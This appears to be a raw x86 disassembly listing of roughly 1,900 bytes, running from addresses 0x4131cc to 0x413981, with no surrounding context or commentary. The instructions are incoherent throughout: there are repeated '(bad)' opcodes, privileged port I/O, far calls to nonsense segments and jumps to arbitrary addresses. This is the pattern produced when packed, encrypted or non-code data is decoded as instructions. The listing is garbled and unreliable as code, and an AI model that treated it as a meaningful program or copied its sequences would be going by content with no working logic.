  4131cc:	not    BYTE PTR [eax]
  4131ce:	adc    bh,cl
  4131d0:	in     al,dx
  4131d1:	xchg   DWORD PTR [edi-0x1eb677df],ecx
  4131d7:	lock mov bh,0x81
  4131da:	mov    edi,DWORD PTR [ebx+0x3780bf1e]
  4131e0:	pop    ebp
  4131e1:	cmc    
  4131e2:	test   esi,0x35804b83
  4131e8:	push   esp
  4131e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131ea:	lahf   
  4131eb:	mov    BYTE PTR ds:0xb983c073,0xdb
  4131f2:	and    esi,ecx
  4131f4:	sub    edx,DWORD PTR [edi]
  4131f6:	cmp    eax,0x57e3de03
  4131fb:	cdq    
  4131fc:	aaa    
  4131fd:	call   0xdf97:0x75ab697e
  413204:	jno    0x41326b
  413206:	ror    ebp,cl
  413208:	mov    ds:0x6d0ca1e7,al
  41320d:	nop
  41320e:	stos   DWORD PTR es:[edi],eax
  41320f:	dec    edx
  413210:	dec    ebx
  413211:	add    BYTE PTR [ecx-0x859e343],al
  413217:	inc    edi
  413218:	imul   ebx,DWORD PTR [eax],0xffffffa7
  41321b:	out    0x45,eax
  41321d:	mov    bh,0xb
  41321f:	int3   
  413220:	and    al,0x26
  413222:	es mov esi,0x3c188e75
  413228:	jo     0x4131d5
  41322a:	add    edx,DWORD PTR [ebp-0x30277e0]
  413230:	sub    ebp,DWORD PTR [edx-0x33]
  413233:	daa    
  413234:	and    eax,0xfd3b7389
  413239:	mov    ebx,0xbfa6a445
  41323e:	push   ebp
  41323f:	xor    ax,0x99ac
  413243:	mov    ds:0xfe1696c3,eax
  413248:	or     BYTE PTR [bx+di-0x5411],bl
  41324d:	repz sub ebp,edi
  413250:	inc    ebp
  413251:	xchg   ebx,eax
  413252:	sub    eax,0x977929a2
  413257:	mov    edi,0xc7607219
  41325c:	inc    edi
  41325d:	loopne 0x413250
  41325f:	js     0x413229
  413261:	fsubr  QWORD PTR [eax+0x98bfa87]
  413267:	jb     0x413206
  413269:	pop    es
  41326a:	xor    al,0xa9
  41326c:	dec    edx
  41326d:	stc    
  41326e:	out    dx,eax
  41326f:	jmp    0x41327a
  413271:	mov    al,0xbf
  413273:	xchg   esp,eax
  413274:	mov    ebx,0xa6b3a96d
  413279:	pusha  
  41327a:	pop    ebx
  41327b:	sbb    al,0xa8
  41327d:	fnop   
  41327f:	mov    ch,bl
  413281:	nop
  413282:	dec    edx
  413283:	bound  edx,QWORD PTR [edx]
  413285:	or     ecx,DWORD PTR [edi+0x3a]
  413288:	xchg   ebx,eax
  413289:	dec    ecx
  41328a:	sub    BYTE PTR [edx-0x61],dh
  41328d:	add    DWORD PTR [edi+0x12],esp
  413290:	out    0x2e,eax
  413292:	xchg   di,ax
  413294:	xchg   esi,eax
  413295:	cli    
  413296:	jne    0x4132aa
  413298:	mov    eax,ecx
  41329a:	mov    eax,edx
  41329c:	mov    ebx,0x6560c59e
  4132a1:	xchg   edi,esp
  4132a3:	mov    es,WORD PTR [edi]
  4132a5:	push   eax
  4132a6:	scas   eax,DWORD PTR es:[edi]
  4132a7:	fnstenv [esi-0x5]
  4132aa:	xchg   edx,eax
  4132ab:	mov    DWORD PTR [ebx-0x6e],esp
  4132ae:	in     eax,dx
  4132af:	retf   
  4132b0:	add    BYTE PTR [edx-0x5e339476],ch
  4132b6:	daa    
  4132b7:	lahf   
  4132b8:	push   edx
  4132b9:	adc    cl,BYTE PTR [edx+0x12]
  4132bc:	push   esi
  4132bd:	xchg   esi,eax
  4132be:	icebp  
  4132bf:	mov    edx,0xa59af794
  4132c4:	lahf   
  4132c5:	xor    esi,DWORD PTR [ebx-0x19]
  4132c8:	retf   0x989f
  4132cb:	jo     0x413306
  4132cd:	ror    esp,0x96
  4132d0:	(bad)  
  4132d1:	mov    edx,0xe353535b
  4132d6:	cmc    
  4132d7:	imul   ecx,esp,0x42
  4132da:	sub    eax,0xf409ebcb
  4132df:	dec    esp
  4132e0:	arpl   WORD PTR [edi+edi*4],ax
  4132e3:	(bad)  
  4132e4:	fdivr  DWORD PTR [ebp+ebp*1-0x2ba72ada]
  4132eb:	rol    DWORD PTR [edi],cl
  4132ed:	cmp    edx,esp
  4132ef:	sar    DWORD PTR [esi+0x3bee100e],1
  4132f5:	mov    edi,0x4e3d128e
  4132fa:	sub    ecx,DWORD PTR ss:[eax]
  4132fd:	out    0x3d,eax
  4132ff:	(bad)  
  413300:	in     eax,dx
  413301:	sbb    ah,dl
  413303:	pop    edx
  413304:	pop    ss
  413305:	aad    0xb3
  413307:	jns    0x4132ab
  413309:	push   esp
  41330a:	push   ss
  41330b:	sbb    DWORD PTR [eax-0x3e706ea5],0x5a871d95
  413315:	xchg   BYTE PTR [edi],cl
  413317:	push   edx
  413318:	jbe    0x413304
  41331a:	out    0x2b,eax
  41331c:	outs   dx,BYTE PTR ds:[esi]
  41331d:	jno    0x4132c5
  41331f:	mov    dl,0xb9
  413321:	enter  0xfe14,0x4f
  413325:	sub    DWORD PTR [ebp+0x4c],esi
  413328:	cmp    eax,0xc0d5a312
  41332d:	jecxz  0x413399
  41332f:	stos   DWORD PTR es:[edi],eax
  413330:	inc    edi
  413331:	dec    ecx
  413332:	lahf   
  413333:	stos   BYTE PTR es:[edi],al
  413334:	sbb    ah,cl
  413336:	jle    0x4132bf
  413338:	sti    
  413339:	xor    DWORD PTR [edx-0x6f],0x14
  41333d:	xlat   BYTE PTR ds:[ebx]
  41333e:	sub    DWORD PTR [edx],edi
  413340:	pop    eax
  413341:	lods   eax,DWORD PTR ds:[esi]
  413342:	xchg   esp,eax
  413343:	ret    0x3d85
  413346:	repnz or ebx,DWORD PTR [bx+0x2d47]
  41334c:	stos   BYTE PTR es:[edi],al
  41334d:	pop    esi
  41334e:	loopne 0x413330
  413350:	hlt    
  413351:	xchg   ecx,eax
  413352:	xchg   esi,eax
  413353:	and    esi,0x62
  413356:	in     eax,0x68
  413358:	ins    BYTE PTR es:[edi],dx
  413359:	pop    ecx
  41335a:	call   0xa37:0x53a5b093
  413361:	mov    WORD PTR [ecx+ebp*1-0x3b3ba95],ds
  413368:	pop    esp
  413369:	xor    ebp,ecx
  41336b:	outs   dx,DWORD PTR ds:[esi]
  41336c:	out    dx,eax
  41336d:	nop
  41336e:	iret   
  41336f:	add    al,0xf4
  413371:	int3   
  413372:	adc    eax,0x9943cbc
  413377:	pop    es
  413378:	cmp    BYTE PTR [ebx-0x75],bh
  41337b:	adc    BYTE PTR [ebp+0x55],cl
  41337e:	mov    bl,0x94
  413380:	dec    ecx
  413381:	cmp    eax,0x75267032
  413386:	cmp    eax,0x356d30e5
  41338b:	cmp    eax,0x2d115840
  413390:	and    ebx,DWORD PTR [ebx]
  413392:	test   DWORD PTR [eax-0x69],eax
  413395:	or     DWORD PTR [esi-0x35192b69],edx
  41339b:	retf   0xe1fd
  41339e:	inc    ebx
  41339f:	xchg   BYTE PTR [ebx],bl
  4133a1:	out    dx,al
  4133a2:	jne    0x41332b
  4133a4:	test   al,0xe8
  4133a6:	add    DWORD PTR [ebp+0xa],edi
  4133a9:	rcr    BYTE PTR [esi+0x56],cl
  4133ac:	inc    eax
  4133ad:	cmp    BYTE PTR [ebx-0x7b],0x7
  4133b1:	or     cl,BYTE PTR [edi]
  4133b3:	in     eax,dx
  4133b4:	adc    cl,BYTE PTR [edi]
  4133b6:	cmp    DWORD PTR [ecx],edi
  4133b8:	imul   esp,DWORD PTR [eax],0xc3595f46
  4133be:	test   al,0xe0
  4133c0:	pushf  
  4133c1:	and    eax,DWORD PTR [eax]
  4133c3:	(bad)  
  4133c4:	xchg   ebx,eax
  4133c5:	push   esi
  4133c6:	add    al,ah
  4133c8:	push   ebx
  4133c9:	and    ecx,esi
  4133cb:	xor    DWORD PTR [eax-0x5f],edi
  4133ce:	lock outs dx,BYTE PTR ds:[esi]
  4133d0:	mov    ss,esi
  4133d2:	sti    
  4133d3:	push   0x35
  4133d5:	sahf   
  4133d6:	sub    ch,al
  4133d8:	adc    eax,0x87c1a414
  4133dd:	nop
  4133de:	lahf   
  4133df:	xchg   ebx,eax
  4133e0:	or     eax,0x3720e959
  4133e5:	repz fmul DWORD PTR [eax]
  4133e8:	ret    
  4133e9:	push   es
  4133ea:	xchg   edx,eax
  4133eb:	ds mov al,0xd6
  4133ee:	jnp    0x4133e5
  4133f0:	in     al,dx
  4133f1:	sti    
  4133f2:	les    edi,FWORD PTR [edx]
  4133f4:	mov    DWORD PTR [eax-0x737d480a],0x44d016a1
  4133fe:	jl     0x4133ed
  413400:	mov    al,0x47
  413402:	cli    
  413403:	or     ecx,ebp
  413405:	test   BYTE PTR [edi],dl
  413407:	in     al,0x4f
  413409:	jl     0x4133ff
  41340b:	fidivr DWORD PTR [edi]
  41340d:	xchg   ebp,eax
  41340e:	lahf   
  41340f:	add    BYTE PTR [ecx],cl
  413411:	pop    esp
  413412:	add    al,0x5e
  413414:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413415:	inc    eax
  413416:	test   BYTE PTR [ebx+ebx*8],al
  413419:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41341a:	stos   BYTE PTR es:[edi],al
  41341b:	xor    al,dl
  41341d:	add    ebx,DWORD PTR [esi+0x26]
  413420:	push   cs
  413421:	or     BYTE PTR [eax-0x73],0x6a
  413425:	and    al,0xb0
  413427:	mov    edi,0x4f336fbb
  41342c:	in     al,0x21
  41342e:	mov    al,0x19
  413430:	or     al,0xf2
  413432:	cmp    eax,0xe808ae37
  413437:	push   ecx
  413438:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413439:	mov    DWORD PTR [ebx],ebp
  41343b:	cli    
  41343c:	sbb    BYTE PTR [ecx+0x73],ah
  41343f:	adc    DWORD PTR [esp+esi*2],ecx
  413442:	ss (bad) 
  413445:	test   al,0x83
  413447:	adc    al,0xec
  413449:	mov    bl,0x69
  41344b:	sub    al,0x95
  41344d:	(bad)  
  41344e:	ins    DWORD PTR es:[edi],dx
  41344f:	mov    dh,0xe4
  413451:	sbb    cl,al
  413453:	cmp    ebp,DWORD PTR [eax-0x72cd79c7]
  413459:	enter  0x4a38,0x3e
  41345d:	mov    ecx,DWORD PTR [esi]
  41345f:	cmp    BYTE PTR [ebp+0x29ba08ff],ah
  413465:	(bad)  
  413466:	push   ebp
  413467:	fdivr  st(1),st
  413469:	jmp    0x4133ec
  41346b:	adc    cl,BYTE PTR [esi+0x9a3f7ba]
  413471:	xor    bh,0xb4
  413474:	call   0xe8cc8f4d
  413479:	cdq    
  41347a:	xchg   ecx,eax
  41347b:	push   0xfffffff3
  41347d:	and    BYTE PTR [ebx-0x5c],al
  413480:	inc    edi
  413481:	hlt    
  413482:	test   eax,0x34ac5926
  413487:	or     ah,cl
  413489:	mov    edx,0x545c32f6
  41348e:	mov    cl,0xaf
  413490:	popf   
  413491:	lea    ebp,[ebx]
  413493:	call   0xf457b153
  413498:	adc    dl,ah
  41349a:	and    BYTE PTR [edx-0x3e],dl
  41349d:	mov    al,ds:0xfdbd2972
  4134a2:	stc    
  4134a3:	test   al,0x5b
  4134a5:	or     edx,DWORD PTR [esi]
  4134a7:	adc    DWORD PTR [esi],esi
  4134a9:	mov    ds:0xef345cb,eax
  4134ae:	fcmovnu st,st(7)
  4134b0:	icebp  
  4134b1:	arpl   di,si
  4134b3:	xchg   esp,eax
  4134b4:	stc    
  4134b5:	in     eax,0xfb
  4134b7:	dec    edi
  4134b8:	and    edx,esp
  4134ba:	dec    ebp
  4134bb:	iret   
  4134bc:	mov    dl,0x5e
  4134be:	add    bh,ch
  4134c0:	mov    ecx,0x2dd6363e
  4134c5:	or     ah,BYTE PTR [edx+0x3a]
  4134c8:	jg     0x4134a8
  4134ca:	or     esp,DWORD PTR [esi-0x47]
  4134cd:	inc    ebx
  4134ce:	ror    BYTE PTR ds:0x43e11753,0x48
  4134d5:	dec    ebx
  4134d6:	cmp    BYTE PTR [edi-0x3efa7d7a],0xe7
  4134dd:	dec    edi
  4134de:	dec    eax
  4134df:	leave  
  4134e0:	sub    BYTE PTR [ecx+0x6f],dh
  4134e3:	push   es
  4134e4:	xchg   edx,eax
  4134e5:	jnp    0x4134e1
  4134e7:	cmp    BYTE PTR [ebx-0x182f71ad],al
  4134ed:	xor    BYTE PTR [ebx+0x20deb059],cl
  4134f3:	jle    0x4134b7
  4134f5:	(bad)  
  4134f6:	(bad)  
  4134f7:	pop    ecx
  4134f8:	lds    esp,FWORD PTR [edi]
  4134fa:	dec    DWORD PTR [ebx-0x655bec81]
  413500:	or     DWORD PTR [ecx+eax*8],0xdd3f5b0b
  413507:	mov    eax,ds:0xb328231c
  41350c:	lahf   
  41350d:	scas   al,BYTE PTR es:[edi]
  41350e:	pop    ebp
  41350f:	mov    bh,0xad
  413511:	loope  0x413557
  413513:	dec    edx
  413514:	xchg   ebx,eax
  413515:	sub    DWORD PTR [edx+0x2b],eax
  413518:	push   edi
  413519:	addr16 inc ecx
  41351b:	push   0x18a5a89d
  413520:	jle    0x4134ae
  413522:	ss (bad) 
  413524:	jno    0x413558
  413526:	ins    BYTE PTR es:[edi],dx
  413527:	cld    
  413528:	jecxz  0x41353a
  41352a:	retf   0x4a76
  41352d:	pusha  
  41352e:	or     al,0xad
  413530:	pop    ecx
  413531:	in     al,0xbc
  413533:	cmp    al,ch
  413535:	aam    0x0
  413537:	mov    eax,ds:0x46b29cea
  41353c:	stos   BYTE PTR es:[edi],al
  41353d:	out    0x9d,al
  41353f:	xor    BYTE PTR ds:[ecx+0x13],0x56
  413544:	outs   dx,DWORD PTR ds:[esi]
  413545:	sub    al,BYTE PTR [edx+0x51]
  413548:	mov    bh,0x2c
  41354a:	xchg   esp,eax
  41354b:	xchg   ebp,eax
  41354c:	push   cs
  41354d:	in     eax,dx
  41354e:	inc    eax
  41354f:	and    al,0xb9
  413551:	pop    esp
  413552:	mov    cl,0x1a
  413554:	outs   dx,BYTE PTR ds:[esi]
  413555:	jo     0x41351b
  413557:	aad    0x86
  413559:	ja     0x413511
  41355b:	mov    ds:0x244ee95e,al
  413560:	imul   esp,DWORD PTR [edx-0x35],0x53c21d10
  413567:	jb     0x41358b
  413569:	imul   esi,ebp,0x69
  41356c:	adc    eax,0x7405527f
  413571:	jb     0x413571
  413573:	fdiv   QWORD PTR [ebx]
  413575:	adc    eax,0x196a2bbb
  41357a:	xor    edx,edx
  41357c:	cmp    dh,BYTE PTR [esi-0x6b0f3be2]
  413582:	pop    eax
  413583:	ret    
  413584:	jnp    0x413586
  413586:	mov    WORD PTR [esi+0x66d425c1],cs
  41358c:	dec    ebx
  41358d:	xor    ebp,ebx
  41358f:	ror    ecx,cl
  413591:	in     al,dx
  413592:	fdivr  QWORD PTR [edx+0x1df57f57]
  413598:	(bad)  
  413599:	cli    
  41359a:	pop    es
  41359b:	dec    ebx
  41359c:	jb     0x41357a
  41359e:	jmp    0x407e:0xfbc5979b
  4135a5:	xchg   esp,edx
  4135a7:	cmp    cl,BYTE PTR [ebp-0x29]
  4135aa:	cmp    eax,0x76a110b1
  4135af:	dec    eax
  4135b0:	prefetch BYTE PTR [edx-0x6a]
  4135b4:	je     0x4135ca
  4135b6:	mov    BYTE PTR [esi],cl
  4135b8:	imul   ebx,edi,0x7ce0ef07
  4135be:	mov    DWORD PTR [ebp+0x4b],esp
  4135c1:	inc    esp
  4135c2:	shl    BYTE PTR [ebp+0x2f],1
  4135c5:	int3   
  4135c6:	inc    ecx
  4135c7:	loopne 0x413637
  4135c9:	pop    edi
  4135ca:	call   0x1c2abc85
  4135cf:	icebp  
  4135d0:	pop    ss
  4135d1:	push   ebx
  4135d2:	adc    DWORD PTR [ebx-0x5fb1b7fd],edx
  4135d8:	inc    edx
  4135d9:	or     BYTE PTR [eax],bh
  4135db:	sbb    DWORD PTR [ebp+0x1e],0x8ebaa5
  4135e2:	push   es
  4135e3:	push   ds
  4135e4:	jae    0x41360d
  4135e6:	inc    esi
  4135e7:	xor    al,0xa
  4135e9:	pop    ss
  4135ea:	daa    
  4135eb:	push   edi
  4135ec:	test   al,0x4c
  4135ee:	mov    ebx,0xe4eaa58c
  4135f3:	inc    eax
  4135f4:	or     esp,DWORD PTR [ebp+0x3a8ec6c]
  4135fa:	cli    
  4135fb:	sub    eax,0xea3b8229
  413600:	into   
  413601:	retf   
  413602:	xor    eax,0x17ba767d
  413607:	int    0x67
  413609:	push   ecx
  41360a:	aad    0xf0
  41360c:	cmp    edx,eax
  41360e:	cmp    al,0x5a
  413610:	test   BYTE PTR [ebx+0x18173f60],bl
  413616:	leave  
  413617:	call   0xf1a8:0xffbc8879
  41361e:	out    dx,al
  41361f:	out    dx,eax
  413620:	rol    BYTE PTR [edi],0xb
  413623:	mov    eax,ds:0xf98ec9a5
  413628:	in     al,dx
  413629:	stos   BYTE PTR es:[edi],al
  41362a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41362b:	pop    es
  41362c:	les    esi,FWORD PTR [ebx-0x65657b7d]
  413632:	nop
  413633:	mov    esi,0xd09dd5
  413638:	jle    0x413645
  41363a:	lahf   
  41363b:	cvtps2pd xmm5,QWORD PTR [edi-0x1]
  41363f:	dec    ebx
  413640:	cmp    eax,0xf03f6451
  413645:	xchg   esp,eax
  413646:	and    eax,0xb40fa142
  41364b:	pop    esi
  41364c:	aaa    
  41364d:	fisubr WORD PTR [ecx+0x749e3449]
  413653:	jo     0x413654
  413655:	add    eax,0xdec19366
  41365a:	shr    DWORD PTR [ecx+0x780c5aa8],0xb
  413661:	mov    bh,0x59
  413663:	test   al,0x75
  413665:	sbb    ah,BYTE PTR [ebp-0x1c34e8e]
  41366b:	pushf  
  41366c:	xchg   BYTE PTR ds:0xd77ccc87,ah
  413672:	ins    BYTE PTR es:[edi],dx
  413673:	out    dx,eax
  413674:	ror    BYTE PTR [ebx-0x44602297],cl
  41367a:	pop    ebp
  41367b:	ror    bl,cl
  41367d:	cli    
  41367e:	cmc    
  41367f:	push   ebx
  413680:	mov    dl,0xb6
  413682:	cmp    BYTE PTR [edx+0x76],al
  413685:	lock in eax,dx
  413687:	inc    esp
  413688:	mov    ebx,0xa9601448
  41368d:	mov    edx,0x9016fbab
  413692:	cmp    ebp,edi
  413694:	xchg   edi,eax
  413695:	mov    esp,0xe7dca039
  41369a:	and    BYTE PTR [ecx+0x1a377eda],0xf1
  4136a1:	sbb    ebp,DWORD PTR [edx-0x65e61a7]
  4136a7:	dec    eax
  4136a8:	inc    ecx
  4136a9:	retf   
  4136aa:	mov    cs,WORD PTR [eax+0x49]
  4136ad:	(bad)
  4136b0:	inc    ecx
  4136b1:	test   BYTE PTR [ebp-0x15fd0f82],0xaa
  4136b8:	daa    
  4136b9:	jmp    0x192c8aea
  4136be:	xor    eax,0x7d780384
  4136c3:	fwait
  4136c4:	in     al,dx
  4136c5:	ins    DWORD PTR es:[edi],dx
  4136c6:	pop    ds
  4136c7:	mov    dl,dl
  4136c9:	imul   edx,DWORD PTR [ebx+0x1b60f6b5],0x62
  4136d0:	clc    
  4136d1:	cdq    
  4136d2:	xor    edx,DWORD PTR [ecx-0xb]
  4136d5:	in     al,dx
  4136d6:	call   esi
  4136d8:	add    bh,BYTE PTR [ecx-0x4a]
  4136db:	shl    DWORD PTR [eax+0x10],1
  4136de:	fist   DWORD PTR [ecx+0x3a]
  4136e1:	dec    ecx
  4136e2:	xchg   ecx,eax
  4136e3:	clc    
  4136e4:	or     eax,0xcc91f1f4
  4136e9:	mov    ecx,0xc4a9d9b8
  4136ee:	jb     0x41367c
  4136f0:	xlat   BYTE PTR ds:[ebx]
  4136f1:	ins    DWORD PTR es:[edi],dx
  4136f2:	ret    
  4136f3:	add    eax,0x1424cb6d
  4136f8:	imul   ecx,DWORD PTR [edi+ecx*2-0x736b5f1f],0xffffff86
  413700:	ror    BYTE PTR [esi],1
  413702:	mul    BYTE PTR [edx]
  413704:	sub    esp,DWORD PTR ds:0x5a0e5e4b
  41370a:	inc    eax
  41370b:	cld    
  41370c:	pop    es
  41370d:	repnz fcom DWORD PTR [ebp-0x319ce908]
  413714:	xchg   DWORD PTR [eax-0x30],esi
  413717:	adc    DWORD PTR [esp+edi*1-0x3f133074],ebx
  41371e:	ficom  DWORD PTR [edi+eax*8+0x45]
  413722:	push   0x30c93198
  413727:	fistp  QWORD PTR [edx]
  413729:	ja     0x413707
  41372b:	popf   
  41372c:	or     BYTE PTR [eax],0x35
  41372f:	outs   dx,DWORD PTR ds:[esi]
  413730:	data16 std 
  413732:	jb     0x4136e6
  413734:	lods   eax,DWORD PTR ds:[esi]
  413735:	pop    es
  413736:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  413738:	arpl   WORD PTR [ebp+0x32],bp
  41373b:	xchg   esi,eax
  41373c:	jns    0x41372c
  41373e:	push   0xfffffff8
  413740:	push   esp
  413741:	sbb    al,0xeb
  413743:	imul   ebp,DWORD PTR [ecx+0x349d7c15],0xf
  41374a:	cmp    eax,0xc44afa30
  41374f:	jp     0x4137b8
  413751:	or     bh,BYTE PTR ds:[esi+0x4d4835c1]
  413758:	jo     0x4137d3
  41375a:	daa    
  41375b:	jb     0x41374c
  41375d:	sahf   
  41375e:	out    dx,al
  41375f:	jl     0x413778
  413761:	ds pushf 
  413763:	mov    eax,0xc1d7f6d
  413768:	sbb    eax,eax
  41376a:	sahf   
  41376b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41376c:	xor    edi,DWORD PTR [eax+0x3c]
  41376f:	cmp    esp,DWORD PTR [edx-0x4b392376]
  413775:	jnp    0x4136f8
  413777:	inc    eax
  413778:	(bad)  
  413779:	mov    ds:0x7e70e21,eax
  41377e:	cmp    ah,dh
  413780:	xor    bh,bh
  413782:	test   BYTE PTR [ebp-0x7d],dl
  413785:	outs   dx,DWORD PTR ds:[esi]
  413786:	xor    DWORD PTR [ebx-0x7fe495c6],eax
  41378c:	in     al,0x78
  41378e:	add    al,0x94
  413790:	scas   eax,DWORD PTR es:[edi]
  413791:	inc    edi
  413792:	or     ebp,DWORD PTR [edx-0x6be47e34]
  413798:	test   eax,eax
  41379a:	pop    eax
  41379b:	mov    bh,0xb9
  41379d:	icebp  
  41379e:	cdq    
  41379f:	xchg   ebx,ebp
  4137a1:	push   esp
  4137a2:	(bad)  
  4137a4:	cmp    dh,BYTE PTR [ebx]
  4137a6:	retf   
  4137a7:	mov    bh,0xd1
  4137a9:	fdivr  DWORD PTR [edi+0x3a]
  4137ac:	ficom  WORD PTR [ebp-0x1b2ed957]
  4137b2:	xchg   al,dh
  4137b4:	pop    ebx
  4137b5:	mov    cl,0x36
  4137b7:	xchg   ebx,eax
  4137b8:	popf   
  4137b9:	mov    ecx,0xdc1a0a0f
  4137be:	test   DWORD PTR [edx+0x7],edx
  4137c1:	add    bl,cl
  4137c3:	sbb    cl,BYTE PTR [edx+edx*4]
  4137c6:	call   0x39fd:0x1d4d6c24
  4137cd:	xchg   ebx,eax
  4137ce:	retf   0xc01f
  4137d1:	mov    eax,ecx
  4137d3:	leave  
  4137d4:	gs jl  0x4137ed
  4137d7:	(bad)
  4137dc:	sbb    al,0x84
  4137de:	push   ss
  4137df:	into   
  4137e0:	xchg   esp,eax
  4137e1:	lods   al,BYTE PTR ds:[esi]
  4137e2:	outs   dx,DWORD PTR ds:[esi]
  4137e3:	xor    edi,edx
  4137e5:	add    bh,ah
  4137e7:	jg     0x4137e6
  4137e9:	jo     0x413822
  4137eb:	xor    dh,cl
  4137ed:	imul   al
  4137ef:	stc    
  4137f0:	push   eax
  4137f1:	jmp    0x97560abe
  4137f6:	test   eax,0xca2566e0
  4137fb:	scas   eax,DWORD PTR es:[edi]
  4137fc:	xor    edi,esp
  4137fe:	ret    
  4137ff:	jae    0x4137a2
  413801:	mov    edx,0x4089ac58
  413806:	sub    DWORD PTR [edx],eax
  413808:	fdiv   DWORD PTR ds:0x3d71ab8
  41380e:	inc    edi
  41380f:	idiv   BYTE PTR [edi-0x26]
  413812:	mov    ?,WORD PTR [esi]
  413814:	push   eax
  413815:	ficomp DWORD PTR [edx+0x47]
  413818:	pop    esi
  413819:	dec    eax
  41381a:	push   ecx
  41381b:	outs   dx,BYTE PTR ds:[esi]
  41381c:	push   esp
  41381d:	(bad)  
  41381e:	retf   
  41381f:	mov    eax,0x101d25d1
  413824:	test   eax,0x63da393f
  413829:	inc    esp
  41382a:	ins    BYTE PTR es:[edi],dx
  41382b:	sbb    ecx,DWORD PTR [eax]
  41382d:	js     0x4137fd
  41382f:	mov    ds:0x2f2f08a6,eax
  413834:	fild   DWORD PTR [ebx+0x1ab1f397]
  41383a:	fstp   TBYTE PTR [edi]
  41383c:	mov    ebp,DWORD PTR [esi+0x40]
  41383f:	bound  esp,QWORD PTR [edi]
  413841:	add    dl,BYTE PTR [ecx-0x4335ce25]
  413847:	add    eax,0xd1d9d006
  41384c:	fwait
  41384d:	outs   dx,DWORD PTR ds:[esi]
  41384e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41384f:	and    al,0xbe
  413851:	xor    al,0xda
  413853:	or     BYTE PTR [ebx],0x6
  413856:	add    dh,BYTE PTR [ebp+0x61]
  413859:	pop    ebx
  41385a:	enter  0xad26,0x6c
  41385e:	jmp    0x31f4f4f9
  413863:	mov    ch,ch
  413865:	pop    esp
  413866:	mov    DWORD PTR [esi-0x69],ebp
  413869:	sub    bl,0x69
  41386c:	in     al,dx
  41386d:	mov    dh,0xe9
  41386f:	jnp    0x4138e6
  413871:	mov    dh,0x61
  413873:	out    0x9,eax
  413875:	sbb    dh,bh
  413877:	or     al,0xf
  413879:	or     edi,DWORD PTR [ebp+0x69eef449]
  41387f:	(bad)  
  413880:	repnz fisub DWORD PTR [ecx]
  413883:	fsub   st(1),st
  413885:	xor    eax,0xe4e37699
  41388a:	in     al,0x15
  41388c:	pop    ds
  41388d:	inc    ecx
  41388e:	sub    eax,0x675e42e3
  413893:	scas   al,BYTE PTR es:[edi]
  413894:	aam    0x52
  413896:	jmp    0x101925d0
  41389b:	loop   0x41390d
  41389d:	xor    cl,al
  41389f:	in     eax,0xd
  4138a1:	mov    DWORD PTR ss:[ecx-0x18],ebp
  4138a5:	jno    0x4138fd
  4138a7:	std    
  4138a8:	mov    ch,BYTE PTR [eax-0x2a84d7d0]
  4138ae:	or     BYTE PTR [esi],0x4b
  4138b1:	xchg   ebx,eax
  4138b2:	or     ch,ah
  4138b4:	ret    
  4138b5:	mov    al,ds:0x2ed0586a
  4138ba:	(bad)  
  4138bb:	or     al,0x12
  4138bd:	fcom   QWORD PTR [ecx+0x6e]
  4138c0:	sub    al,0x9e
  4138c2:	hlt    
  4138c3:	out    dx,al
  4138c4:	ins    BYTE PTR es:[edi],dx
  4138c5:	push   0xe7e7041
  4138ca:	loopne 0x4138c4
  4138cc:	inc    edi
  4138cd:	mov    ds:0x8465c2ee,eax
  4138d2:	stc    
  4138d3:	and    al,0x8c
  4138d5:	jp     0x413930
  4138d7:	xor    ebx,ecx
  4138d9:	mov    ecx,0x1e5e2770
  4138de:	inc    esi
  4138df:	and    ebp,ebp
  4138e1:	add    eax,0xc326624
  4138e6:	aaa    
  4138e7:	fwait
  4138e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138e9:	push   esp
  4138ea:	in     al,0xb1
  4138ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138ed:	lahf   
  4138ee:	jmp    0x120ae746
  4138f3:	push   esp
  4138f4:	in     eax,0x45
  4138f6:	ins    DWORD PTR es:[edi],dx
  4138f7:	stos   DWORD PTR es:[edi],eax
  4138f8:	(bad)  
  4138f9:	push   ebp
  4138fa:	jge    0x90058b22
  413900:	sbb    dh,ch
  413902:	hlt    
  413903:	ret    
  413904:	inc    ecx
  413905:	test   ebp,eax
  413907:	xchg   ecx,eax
  413908:	and    edx,DWORD PTR [ecx-0x71dfa2ca]
  41390e:	jl     0x4138ac
  413910:	dec    ebx
  413911:	mov    ds:0x4847128a,al
  413916:	pop    ebx
  413917:	jo     0x413960
  413919:	jns    0x41389c
  41391b:	jecxz  0x413992
  41391d:	pushf  
  41391e:	jbe    0x413930
  413920:	shl    BYTE PTR [eax+0x7d4d06d6],cl
  413926:	or     ah,BYTE PTR [edi+0x424701d0]
  41392c:	scas   al,BYTE PTR es:[edi]
  41392d:	mov    al,ds:0x272e4486
  413932:	inc    ebx
  413933:	lods   eax,DWORD PTR ds:[esi]
  413934:	pushf  
  413935:	je     0x413936
  413937:	cmp    esp,DWORD PTR [esi]
  413939:	leave  
  41393a:	mov    WORD PTR [esp+ebx*8+0x1a],ss
  41393e:	pop    edi
  41393f:	or     al,0x3b
  413941:	ins    BYTE PTR es:[edi],dx
  413942:	icebp  
  413943:	jo     0x41392e
  413945:	mov    cl,0xeb
  413947:	out    0x5a,al
  413949:	addr16 retf 
  41394b:	push   es
  41394c:	cmp    ebx,DWORD PTR [edx+esi*8+0x6f4b7bb]
  413953:	loopne 0x4139c3
  413955:	pop    edx
  413956:	daa    
  413957:	xchg   ebx,eax
  413958:	ds pop eax
  41395a:	mov    es,WORD PTR [edi-0xe]
  41395d:	clc    
  41395e:	into   
  41395f:	ins    BYTE PTR es:[edi],dx
  413960:	dec    edx
  413961:	sub    eax,0x656424e0
  413966:	dec    ebx
  413967:	pop    ss
  413968:	call   0xb635e3dd
  41396d:	jb     0x413962
  41396f:	mov    ah,0x10
  413971:	nop
  413972:	repnz mov esi,0xd4a775f0
  413978:	rol    DWORD PTR [ecx+esi*1],0xe7
  41397c:	xchg   ebp,eax
  41397d:	xchg   ecx,eax
  41397e:	and    ebp,DWORD PTR [eax]
  413980:	ins    BYTE PTR es:[edi],dx
  413981:	add    eax,0x8ee8292b
